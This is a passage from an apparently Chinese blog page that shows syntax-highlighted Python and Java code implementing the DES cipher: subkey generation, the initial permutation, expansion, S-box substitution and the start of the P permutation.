class="number">1</span>]</span><br><span class="line">        <span class="keyword">assert</span> len(L0) == <span class="number">28</span> <span class="comment">#if no 28bit error</span></span><br><span class="line">        <span class="keyword">assert</span> len(R0) == <span class="number">28</span></span><br><span class="line">        Sonkey = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">            print(<span class="string">"Movetimes : "</span>,i)</span><br><span class="line">            L0 = result(L0, Movetimes[i])</span><br><span class="line">            R0 = result(R0, Movetimes[i])</span><br><span class="line">            print(<span class="string">"L0 : "</span>, L0)</span><br><span class="line">            print(<span class="string">"R0 : "</span>, R0)</span><br><span class="line">            mergedKey = L0 + R0</span><br><span class="line">            tempkey = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> PC_2_TABLE:</span><br><span class="line">                tempkey += mergedKey[j - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">assert</span> len(tempkey) == <span class="number">48</span></span><br><span class="line">            print(<span class="string">"Your NO."</span>,i,<span class="string">" Sonkey :"</span>,tempkey)</span><br><span class="line">            Sonkey.append(tempkey)</span><br><span class="line">        <span class="keyword">return</span> Sonkey</span><br></pre></td></tr></table></figure>

<h4 id="DES轮函数实现"><a href="#DES轮函数实现" class="headerlink" title="DES轮函数实现"></a>DES轮函数实现</h4><p>Java实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DES</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">intToHex</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        StringBuffer s = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String a;</span><br><span class="line">        <span class="keyword">char</span> []b = &#123;<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">0</span>)&#123;</span><br><span class="line">            s = s.append(b[n%<span class="number">16</span>]);</span><br><span class="line">            n = n/<span class="number">16</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a = s.reverse().toString();</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String hexStr =  <span class="string">"0123456789ABCDEF"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String[] binaryArray =</span><br><span class="line">            &#123;<span class="string">"0000"</span>,<span class="string">"0001"</span>,<span class="string">"0010"</span>,<span class="string">"0011"</span>,</span><br><span class="line">                    <span class="string">"0100"</span>,<span class="string">"0101"</span>,<span class="string">"0110"</span>,<span class="string">"0111"</span>,</span><br><span class="line">                    <span class="string">"1000"</span>,<span class="string">"1001"</span>,<span class="string">"1010"</span>,<span class="string">"1011"</span>,</span><br><span class="line">                    <span class="string">"1100"</span>,<span class="string">"1101"</span>,<span class="string">"1110"</span>,<span class="string">"1111"</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bin2HexStr</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span></span>&#123;</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        String hex = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">            <span class="comment">//字节高4位</span></span><br><span class="line">            hex = String.valueOf(hexStr.charAt((bytes[i]&amp;<span class="number">0xF0</span>)&gt;&gt;<span class="number">4</span>));</span><br><span class="line">            <span class="comment">//字节低4位</span></span><br><span class="line">            hex += String.valueOf(hexStr.charAt(bytes[i]&amp;<span class="number">0x0F</span>));</span><br><span class="line">            result +=hex;  <span class="comment">//+" "</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    String ClearTxt = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] BinaryClearTxt = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] Sonkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">16</span>][<span class="number">48</span>];</span><br><span class="line">    <span class="keyword">int</span>[] ret = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] IP(<span class="keyword">int</span>[] BinaryClearTxt)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] IPTABLE = &#123;<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">                <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span>(BinaryClearTxt.length != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your key Text lenth is Error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; IPTABLE.length;i++)&#123;</span><br><span class="line">                ret[i] = BinaryClearTxt[IPTABLE[i]-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">"Source ClearText : "</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;BinaryClearTxt.length;i++)&#123;</span><br><span class="line">                System.out.print(BinaryClearTxt[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">expend</span><span class="params">(String Rn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ETABLE = &#123;<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">                <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">                <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">                <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        String retRn = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;ETABLE.length;i++)&#123;</span><br><span class="line">            retRn += Rn.charAt(ETABLE[i]-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retRn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">S_sub</span><span class="params">(String S_Input)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] STABLE = &#123;&#123;<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">                <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">                <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>&#125;,</span><br><span class="line">                &#123;<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">                <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>&#125;,</span><br><span class="line">                &#123;<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>&#125;,</span><br><span class="line">                &#123;<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>&#125;,</span><br><span class="line">                &#123;<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">                <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>&#125;,</span><br><span class="line">                &#123;<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">                <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>&#125;,</span><br><span class="line">                &#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>&#125;,</span><br><span class="line">                &#123;<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>&#125;&#125;;</span><br><span class="line">        String retstr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span> (S_Input.length()&lt;<span class="number">48</span>)&#123;</span><br><span class="line">            S_Input = <span class="string">"0"</span> + S_Input;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] Slist = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">64</span>;j++)&#123;</span><br><span class="line">                Slist[j] = STABLE[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> row = (S_Input.charAt(index)-<span class="string">'0'</span>)*<span class="number">2</span>+(S_Input.charAt(index+<span class="number">5</span>)-<span class="string">'0'</span>);</span><br><span class="line">            <span class="keyword">int</span> col = (S_Input.charAt(index+<span class="number">1</span>)-<span class="string">'0'</span>)*<span class="number">8</span> + (S_Input.charAt(index+<span class="number">2</span>)-<span class="string">'0'</span>)*<span class="number">4</span>+(S_Input.charAt(index+<span class="number">3</span>)-<span class="string">'0'</span>)*<span class="number">2</span>+(S_Input.charAt(index+<span class="number">4</span>)-<span class="string">'0'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            String ret_single = Integer.toBinaryString(Slist[row*<span class="number">16</span>+col]);</span><br><span class="line">            <span class="keyword">while</span> (ret_single.length() &lt; <span class="number">4</span>)&#123;</span><br><span class="line">                ret_single = <span class="string">"0"</span> + ret_single;</span><br><span class="line">            &#125;</span><br><span class="line">            retstr += ret_single;</span><br><span class="line">            index += <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (retstr.length() != <span class="number">32</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your S_sub retstr lenth is erroe!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retstr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String[] P(String Ln,String S_sub_str,String Rn)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] PTABLE = &#123;<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, 